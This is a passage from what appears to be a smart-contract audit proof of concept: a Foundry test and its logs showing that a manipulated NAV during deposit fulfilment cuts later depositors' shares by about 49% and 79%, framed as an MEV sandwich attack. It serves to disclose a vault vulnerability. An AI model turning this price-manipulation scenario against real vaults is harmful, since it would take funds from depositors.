Manager);\n        mockAccountant.setNav(2_000_200 ether); // Pool price pumped by MEV\n        mockAccountant.setExpectedVault(address(vault));\n        vault.fulfillDeposits(100 ether, \"\");\n        vm.stopPrank();\n        \n        vm.startPrank(Charlie);\n        vault.executeDeposit(Charlie, 2);\n        vm.stopPrank();\n        \n        uint256 charlieShares = vault.balanceOf(Charlie);\n        console.log(\"Charlie gets:\", charlieShares, \"shares\");\n        \n        console.log(\"MEV bot back-runs to dump and profit\");\n        \n        // Multiple MEV bots coordinate\n        console.log(\"\\n--- Coordinated MEV attack ---\");\n        \n        vm.startPrank(Dave);\n        vault.requestDeposit(100 ether);\n        vm.stopPrank();\n        console.log(\"Dave deposits 100 tokens\");\n        \n        console.log(\"Multiple MEV bots coordinate massive price manipulation\");\n        \n        vm.startPrank(Manager);\n        mockAccountant.setNav(5_000_300 ether); // Extreme price manipulation\n        mockAccountant.setExpectedVault(address(vault));\n        vault.fulfillDeposits(100 ether, \"\");\n        vm.stopPrank();\n        \n        vm.startPrank(Dave);\n        vault.executeDeposit(Dave, 3);\n        vm.stopPrank();\n        \n        uint256 daveShares = vault.balanceOf(Dave);\n        console.log(\"Dave gets:\", daveShares, \"shares\");\n        \n        // Show the damage\n        console.log(\"\\n=== Results ===\");\n        console.log(\"Same 100 token deposit, different results:\");\n        console.log(\"Bob:     \", bobShares);\n        console.log(\"Charlie: \", charlieShares);\n        console.log(\"Dave:    \", daveShares);\n        \n        uint256 charlieLoss = bobShares - charlieShares;\n        uint256 daveLoss = bobShares - daveShares;\n        \n        console.log(\"\\nValue stolen by MEV:\");\n        console.log(\"From Charlie:\", charlieLoss, \"shares\");\n        console.log(\"From Dave:   \", daveLoss, \"shares\");\n        \n        console.log(\"\\nPercentage stolen:\");\n        console.log(\"Charlie: \", (charlieLoss * 100) / bobShares, \"%\");\n        console.log(\"Dave:    \", (daveLoss * 100) / bobShares, \"%\");\n        \n        \n        // Verify the attack worked\n        assertGt(bobShares, charlieShares, \"MEV should reduce Charlie's shares\");\n        assertGt(charlieShares, daveShares, \"Coordinated MEV should be worse\");\n        assertGt(charlieLoss, 0, \"Charlie should lose value\");\n        assertGt(daveLoss, charlieLoss, \"Dave should lose more\");\n    }\n```\n\nOutput:\n\n```bash\nLogs:\n  === MEV Sandwich Attack on Deposits ===\n  Vault ready for testing\n  \n--- Normal deposit ---\n  Bob deposits 100 tokens\n  Bob gets: 100000000000000000000000000 shares\n  \n--- MEV sandwich attack ---\n  Charlie deposits 100 tokens\n  MEV bot sees fulfillment tx in mempool\n  Front-runs with big swap to pump pool price\n  Charlie gets: 50002499875006249687515649 shares\n  MEV bot back-runs to dump and profit\n  \n--- Coordinated MEV attack ---\n  Dave deposits 100 tokens\n  Multiple MEV bots coordinate massive price manipulation\n  Dave gets: 20002199961999020164187198 shares\n  \n=== Results ===\n  Same 100 token deposit, different results:\n  Bob:      100000000000000000000000000\n  Charlie:  50002499875006249687515649\n  Dave:     20002199961999020164187198\n  \nValue stolen by MEV:\n  From Charlie: 49997500124993750312484351 shares\n  From Dave:    79997800038000979835812802 shares\n  \nPercentage stolen:\n  Charlie:  49 %\n  Dave:     79 %\n```",
